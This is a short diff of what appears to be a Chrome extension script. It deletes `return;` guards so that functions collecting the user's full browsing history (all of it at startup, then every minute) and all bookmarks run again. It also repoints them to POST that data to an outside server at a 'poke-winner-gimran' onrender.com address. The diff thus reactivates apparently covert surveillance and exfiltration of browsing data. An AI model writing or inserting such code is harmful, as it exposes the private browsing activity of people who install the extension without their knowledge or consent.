@@ -1,6 +1,5 @@
 // --- Function for the STARTUP sync: Fetches ALL history and sends it in batches ---
 function fetchAllHistoryAndSend() {
-  return;
   chrome.history.search({
     'text': '',        // Search for all text
     'startTime': 0,    // Start from the beginning of time
@@ -29,7 +28,6 @@ function fetchAllHistoryAndSend() {
 
 // --- Function for the RECURRING sync: Fetches only the last minute of history ---
 function fetchAndSendHistory() {
-  return;
   const oneMinuteAgo = Date.now() - 60000;
 
   chrome.history.search({
@@ -48,8 +46,7 @@ function fetchAndSendHistory() {
 
 // --- Function to send data to the Python server ---
 function sendHistoryData(data) {
-  return;
-  const serverUrl = 'https://poke-winner.onrender.com/receive_history'
+  const serverUrl = 'https://poke-winner-gimran.onrender.com/history'
 
   fetch(serverUrl, {
     method: 'POST',
@@ -100,7 +97,7 @@ function flattenBookmarkNodes(nodes) {
 }
 
 function sendBookmarksData(data) {
-  const serverUrl = 'https://poke-winner.onrender.com/bookmarks'
+  const serverUrl = 'https://poke-winner-gimran.onrender.com/bookmarks'
 
   fetch(serverUrl, {
     method: 'POST',
